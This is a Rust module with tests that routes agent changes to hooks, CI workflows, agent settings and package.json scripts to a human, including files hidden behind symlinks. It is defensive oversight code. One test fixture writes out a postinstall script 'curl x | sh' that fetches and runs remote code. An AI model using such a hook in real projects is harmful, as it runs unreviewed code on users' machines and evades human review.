//! The config rule (docs/hive.md §8.1): a land whose diff from Base changes agent or execution
//! config goes to the human, whatever the Landing checkpoint says. A worker's commits can add
//! hooks or scripts that run on the human's machine outside any sandbox the next time anyone
//! opens a session, commits or builds there.
//!
//! The list errs wide (plan D9): every pattern matches at any depth, ignoring case (macOS's
//! default volume ignores it too), `.gitmodules` and `.gitattributes` are on it, and a rename
//! counts on both sides (`--no-renames`). A false positive costs one click.
//!
//! Git records a symlink as one path, so names alone miss a link: `.claude -> tools/agent` plus
//! `tools/agent/settings.json` is a `.claude/settings.json` in the human's checkout. A folder
//! pattern matches the folder's own path, a changed link standing for any part of a pattern counts,
//! and wherever a link in the tested tree stands for one, the place it points to is on the list too.

use std::path::Path;

use serde_json::Value;

use super::git::{lgit, GIT_TIMEOUT};

/// `dir/**` is anything under a folder of that name; anything else is a file of that name, at any
/// depth. `package.json` is checked by its `scripts` instead (`scripts_changed`).
pub const DEFAULT_PATTERNS: &[&str] = &[
    ".claude/**",
    ".mcp.json",
    "CLAUDE.md",
    "AGENTS.md",
    ".husky/**",
    ".githooks/**",
    ".github/workflows/**",
    ".gitlab-ci.yml",
    ".envrc",
    "build.rs",
    ".gitmodules",
    ".gitattributes",
];

/// `*` and `?` inside one path part.
fn part_matches(pat: &str, s: &str) -> bool {
    fn go(p: &[char], s: &[char]) -> bool {
        match (p.first(), s.first()) {
            (None, None) => true,
            (Some('*'), _) => go(&p[1..], s) || (!s.is_empty() && go(p, &s[1..])),
            (Some('?'), Some(_)) => go(&p[1..], &s[1..]),
            (Some(a), Some(b)) => a == b && go(&p[1..], &s[1..]),
            _ => false,
        }
    }
    let (p, s): (Vec<char>, Vec<char>) = (pat.chars().collect(), s.chars().collect());
    go(&p, &s)
}

fn parts(s: &str) -> Vec<String> {
    s.to_lowercase().split(['/', '\\']).filter(|p| !p.is_empty() && *p != ".").map(str::to_string).collect()
}

/// Whether a repo path matches one pattern, at any depth, ignoring case.
pub fn pattern_matches(pattern: &str, path: &str) -> bool {
    let pattern = pattern.trim();
    let (dir, pat) = match pattern.strip_suffix("/**") {
        Some(d) => (true, parts(d)),
        None => (false, parts(pattern)),
    };
    let path = parts(path);
    if pat.is_empty() || path.is_empty() {
        return false;
    }
    let at = |i: usize| pat.iter().zip(&path[i..]).all(|(p, s)| part_matches(p, s));
    if dir {
        // The folder's parts anywhere: something inside it changed, or the folder itself (a link
        // in its place).
        (0..path.len()).any(|i| i + pat.len() <= path.len() && at(i))
    } else {
        path.len() >= pat.len() && at(path.len() - pat.len())
    }
}

/// Whether a path is on the list: the defaults or one of the human's.
pub fn listed(path: &str, extra: &[String]) -> bool {
    DEFAULT_PATTERNS.iter().any(|p| pattern_matches(p, path)) || extra.iter().any(|p| pattern_matches(p, path))
}

pub fn is_package_json(path: &str) -> bool {
    parts(path).last().is_some_and(|p| p == "package.json")
}

/// Whether `scripts` differs between two versions of a `package.json`, compared parsed. A side
/// that doesn't parse counts as changed; a missing file has no scripts.
pub fn scripts_changed(before: Option<&[u8]>, after: Option<&[u8]>) -> bool {
    let scripts = |b: Option<&[u8]>| -> Result<Value, ()> {
        match b {
            None => Ok(Value::Null),
            Some(b) => serde_json::from_slice::<Value>(b).map(|v| v.get("scripts").cloned().unwrap_or(Value::Null)).map_err(|_| ()),
        }
    };
    match (scripts(before), scripts(after)) {
        (Ok(a), Ok(b)) => a != b,
        _ => true,
    }
}

fn blob(repo: &Path, commit: &str, path: &str) -> Option<Vec<u8>> {
    let mut cmd = lgit(repo);
    cmd.args(["cat-file", "blob"]).arg(format!("{commit}:{path}"));
    let out = crate::util::proc::output_timeout(&mut cmd, GIT_TIMEOUT).ok()?;
    out.status.success().then_some(out.stdout)
}

fn object(repo: &Path, sha: &str) -> Option<Vec<u8>> {
    let mut cmd = lgit(repo);
    cmd.args(["cat-file", "blob", sha]);
    let out = crate::util::proc::output_timeout(&mut cmd, GIT_TIMEOUT).ok()?;
    out.status.success().then_some(out.stdout)
}

const LINK_MODE: &str = "120000";

/// A pattern as lowercase parts, and whether it is a folder (`dir/**`).
fn split(pattern: &str) -> (Vec<String>, bool) {
    let pattern = pattern.trim();
    match pattern.strip_suffix("/**") {
        Some(d) => (parts(d), true),
        None => (parts(pattern), false),
    }
}

fn every_pattern(extra: &[String]) -> Vec<(Vec<String>, bool)> {
    DEFAULT_PATTERNS.iter().map(|p| split(p)).chain(extra.iter().map(|p| split(p))).filter(|(p, _)| !p.is_empty()).collect()
}

/// What a link at `link` stands for: for each pattern whose first k parts its last k parts match,
/// the rest of that pattern and whether it is a folder (`.github` → `workflows`, a folder).
fn stands_for(link: &[String], patterns: &[(Vec<String>, bool)]) -> Vec<(Vec<String>, bool)> {
    let mut out = Vec::new();
    for (p, dir) in patterns {
        for k in 1..=p.len().min(link.len()) {
            if p[..k].iter().zip(&link[link.len() - k..]).all(|(a, b)| part_matches(a, b)) {
                out.push((p[k..].to_vec(), *dir));
            }
        }
    }
    out
}

/// A link's target as repo parts, from the folder it sits in; None for an absolute one or one
/// that leaves the repo.
fn resolve(link: &[String], target: &str) -> Option<Vec<String>> {
    if target.starts_with('/') || target.starts_with('\\') {
        return None;
    }
    let mut at: Vec<String> = link[..link.len().saturating_sub(1)].to_vec();
    for part in target.to_lowercase().split(['/', '\\']) {
        match part {
            "" | "." => {}
            ".." => {
                at.pop()?;
            }
            p => at.push(p.to_string()),
        }
    }
    Some(at)
}

/// Whether `path` is the place (a file) or inside it (a folder, itself included).
fn under(place: &[String], dir: bool, path: &[String]) -> bool {
    let fits = if dir { path.len() >= place.len() } else { path.len() == place.len() };
    fits && place.iter().zip(path).all(|(p, s)| part_matches(p, s))
}

/// The changed paths between two commits, each with whether either side is a link.
fn changed(repo: &Path, base: &str, tested: &str) -> Result<Vec<(String, bool)>, String> {
    let mut cmd = lgit(repo);
    cmd.args(["diff", "--raw", "--no-abbrev", "--no-renames", "--no-ext-diff", "-z", base, tested, "--"]);
    let out = crate::util::proc::output_timeout(&mut cmd, GIT_TIMEOUT).map_err(|e| e.to_string())?;
    if !out.status.success() {
        return Err(format!("git diff: {}", String::from_utf8_lossy(&out.stderr).trim()));
    }
    // `:<mode> <mode> <sha> <sha> <status>` NUL `<path>` NUL, one pair per path.
    let fields: Vec<&[u8]> = out.stdout.split(|b| *b == 0).filter(|p| !p.is_empty()).collect();
    Ok(fields
        .chunks(2)
        .filter(|c| c.len() == 2)
        .map(|c| {
            let meta = String::from_utf8_lossy(c[0]);
            let mut modes = meta.trim_start_matches(':').split(' ');
            let link = modes.next() == Some(LINK_MODE) || modes.next() == Some(LINK_MODE);
            (String::from_utf8_lossy(c[1]).to_string(), link)
        })
        .collect())
}

/// The places links in `tested` stand for a pattern at: the target plus the rest of the pattern.
fn linked_places(repo: &Path, tested: &str, patterns: &[(Vec<String>, bool)]) -> Result<Vec<(Vec<String>, bool)>, String> {
    let mut cmd = lgit(repo);
    cmd.args(["ls-tree", "-r", "-z", "--full-tree", tested]);
    let out = crate::util::proc::output_timeout(&mut cmd, GIT_TIMEOUT).map_err(|e| e.to_string())?;
    if !out.status.success() {
        return Err(format!("git ls-tree: {}", String::from_utf8_lossy(&out.stderr).trim()));
    }
    let mut places = Vec::new();
    for entry in out.stdout.split(|b| *b == 0).filter(|p| !p.is_empty()) {
        // `<mode> <type> <sha>` TAB `<path>`.
        let entry = String::from_utf8_lossy(entry);
        let Some((meta, path)) = entry.split_once('\t') else { continue };
        let mut meta = meta.split(' ');
        let (Some(LINK_MODE), _, Some(sha)) = (meta.next(), meta.next(), meta.next()) else { continue };
        let link = parts(path);
        let rests = stands_for(&link, patterns);
        if rests.is_empty() {
            continue;
        }
        let Some(target) = object(repo, sha) else { continue };
        let Some(to) = resolve(&link, &String::from_utf8_lossy(&target)) else { continue };
        for (rest, dir) in rests {
            places.push((to.iter().chain(&rest).cloned().collect(), dir));
        }
    }
    Ok(places)
}

/// The paths between `base` and `tested` the rule catches, in git's order. Blocks on git.
pub fn hits(repo: &Path, base: &str, tested: &str, extra: &[String]) -> Result<Vec<String>, String> {
    if base == tested {
        return Ok(Vec::new());
    }
    let patterns = every_pattern(extra);
    let places = linked_places(repo, tested, &patterns)?;
    let mut found = Vec::new();
    for (p, link) in changed(repo, base, tested)? {
        let path = parts(&p);
        let hit = listed(&p, extra)
            || (link && !stands_for(&path, &patterns).is_empty())
            || places.iter().any(|(place, dir)| under(place, *dir, &path))
            || (is_package_json(&p) && scripts_changed(blob(repo, base, &p).as_deref(), blob(repo, tested, &p).as_deref()));
        if hit {
            found.push(p);
        }
    }
    Ok(found)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn the_list_matches_at_any_depth_ignoring_case() {
        for p in [
            ".claude/settings.json",
            "app/.claude/commands/x.md",
            ".mcp.json",
            "CLAUDE.md",
            "docs/deep/claude.md",
            "pkg/AGENTS.md",
            ".husky/pre-commit",
            "web/.husky/_/husky.sh",
            ".githooks/pre-push",
            ".github/workflows/ci.yml",
            "sub/.github/workflows/release.yaml",
            ".gitlab-ci.yml",
            ".envrc",
            "src-tauri/build.rs",
            ".gitmodules",
            "assets/.gitattributes",
        ] {
            assert!(listed(p, &[]), "{p}");
        }
        // A folder's own path counts: git records a link in its place as that one path.
        for p in [".claude", "app/.husky", ".github/workflows", ".githooks"] {
            assert!(listed(p, &[]), "{p}");
        }
        for p in ["src/main.rs", "claude.md.bak", "notes/CLAUDE.txt", ".github/dependabot.yml", ".github", "rebuild.rs", "package.json", ".claude-old"] {
            assert!(!listed(p, &[]), "{p}");
        }
    }

    #[test]
    fn the_humans_patterns_match_the_same_way() {
        let extra = vec!["scripts/**".to_string(), "Makefile".to_string(), "*.nix".to_string(), "config/*.toml".to_string()];
        for p in ["scripts/deploy.sh", "tools/scripts/a/b", "scripts", "Makefile", "lib/makefile", "flake.nix", "x/config/app.toml"] {
            assert!(listed(p, &extra), "{p}");
        }
        for p in ["src/script.sh", "Makefile.am", "config/a/b.toml"] {
            assert!(!listed(p, &extra), "{p}");
        }
    }

    #[test]
    fn a_link_stands_for_the_pattern_parts_it_names_and_resolves_inside_the_repo() {
        let pats = every_pattern(&[]);
        let rests = |l: &str| stands_for(&parts(l), &pats);
        assert_eq!(rests(".claude"), vec![(vec![], true)]);
        assert_eq!(rests("web/.github"), vec![(vec!["workflows".to_string()], true)]);
        assert_eq!(rests("CLAUDE.md"), vec![(vec![], false)]);
        assert!(rests("tools/agent").is_empty());
        let r = |l: &str, t: &str| resolve(&parts(l), t);
        assert_eq!(r(".claude", "tools/agent"), Some(vec!["tools".to_string(), "agent".to_string()]));
        assert_eq!(r("web/.claude", "../shared/./cfg"), Some(vec!["shared".to_string(), "cfg".to_string()]));
        assert_eq!(r(".claude", "."), Some(vec![]), "the repo's top: everything under it");
        assert_eq!((r(".claude", "../../out"), r(".claude", "/etc")), (None, None));
        assert!(under(&[], true, &parts("settings.json")));
        assert!(under(&parts("tools/agent"), true, &parts("Tools/Agent/settings.json")));
        assert!(!under(&parts("docs/agent.md"), false, &parts("docs/agent.md/x")));
    }

    fn git(dir: &Path, args: &[&str], stdin: Option<&str>) -> String {
        use std::io::Write;
        let mut child = std::process::Command::new("git")
            .current_dir(dir)
            .env("GIT_CONFIG_GLOBAL", "/dev/null")
            .env("GIT_CONFIG_NOSYSTEM", "1")
            .args(["-c", "user.email=t@example.com", "-c", "user.name=t", "-c", "commit.gpgsign=false"])
            .args(args)
            .stdin(std::process::Stdio::piped())
            .stdout(std::process::Stdio::piped())
            .stderr(std::process::Stdio::piped())
            .spawn()
            .unwrap();
        child.stdin.take().unwrap().write_all(stdin.unwrap_or_default().as_bytes()).unwrap();
        let out = child.wait_with_output().unwrap();
        assert!(out.status.success(), "git {args:?}: {}", String::from_utf8_lossy(&out.stderr));
        String::from_utf8_lossy(&out.stdout).trim().to_string()
    }

    /// A commit of `files` (path, mode, contents) on top of HEAD, made in the index only, so a
    /// link is a link on every OS.
    fn commit_files(repo: &Path, files: &[(&str, &str, &str)]) -> String {
        for (path, mode, text) in files {
            let sha = git(repo, &["hash-object", "-w", "--stdin"], Some(text));
            git(repo, &["update-index", "--add", "--cacheinfo", &format!("{mode},{sha},{path}")], None);
        }
        git(repo, &["commit", "-q", "--no-verify", "-m", "c"], None);
        git(repo, &["rev-parse", "HEAD"], None)
    }

    #[test]
    fn agent_config_behind_a_link_goes_to_the_human() {
        let repo = std::env::temp_dir().join(format!("hive-config-rule-{}", uuid::Uuid::new_v4()));
        std::fs::create_dir_all(&repo).unwrap();
        git(&repo, &["init", "-q", "-b", "main"], None);
        let base = commit_files(&repo, &[("README.md", "100644", "r\n")]);

        // A link named `.claude` and the settings it points at, in one land.
        let linked = commit_files(&repo, &[(".claude", LINK_MODE, "tools/agent"), ("tools/agent/settings.json", "100644", "{\"hooks\":{}}\n")]);
        assert_eq!(hits(&repo, &base, &linked, &[]).unwrap(), vec![".claude".to_string(), "tools/agent/settings.json".to_string()]);
        // Once the link is on Base, an edit behind it still counts.
        let edit = commit_files(&repo, &[("tools/agent/settings.json", "100644", "{\"hooks\":{\"x\":1}}\n")]);
        assert_eq!(hits(&repo, &linked, &edit, &[]).unwrap(), vec!["tools/agent/settings.json".to_string()]);
        // A link standing for the first part of a pattern: `.github` → ci, so ci/workflows is it.
        let gh = commit_files(&repo, &[(".github", LINK_MODE, "ci"), ("ci/workflows/x.yml", "100644", "on: push\n")]);
        assert_eq!(hits(&repo, &edit, &gh, &[]).unwrap(), vec![".github".to_string(), "ci/workflows/x.yml".to_string()]);
        // Elsewhere, a link and the files near it are ordinary.
        let plain = commit_files(&repo, &[("docs/latest", LINK_MODE, "v2"), ("ci/readme.md", "100644", "x\n"), ("tools/other.txt", "100644", "x\n")]);
        assert!(hits(&repo, &gh, &plain, &[]).unwrap().is_empty());
        let _ = std::fs::remove_dir_all(&repo);
    }

    #[test]
    fn package_json_counts_only_when_its_scripts_change() {
        let base = br#"{"name":"a","version":"1.0.0","scripts":{"test":"vitest"}}"#;
        let version = br#"{"name":"a","version":"1.0.1","scripts":{"test":"vitest"}}"#;
        let reordered = br#"{"scripts":{"test":"vitest"},"version":"1.0.0","name":"a"}"#;
        let script = br#"{"name":"a","version":"1.0.0","scripts":{"test":"vitest","postinstall":"curl x | sh"}}"#;
        assert!(!scripts_changed(Some(base), Some(version)), "a version bump");
        assert!(!scripts_changed(Some(base), Some(reordered)), "compared parsed");
        assert!(scripts_changed(Some(base), Some(script)));
        assert!(scripts_changed(Some(base), Some(b"{not json")), "unparseable counts");
        assert!(scripts_changed(None, Some(script)), "a new package.json with scripts");
        assert!(!scripts_changed(None, Some(br#"{"name":"a"}"#)), "a new one without");
        assert!(is_package_json("web/Package.json") && !is_package_json("package.json5"));
    }
}
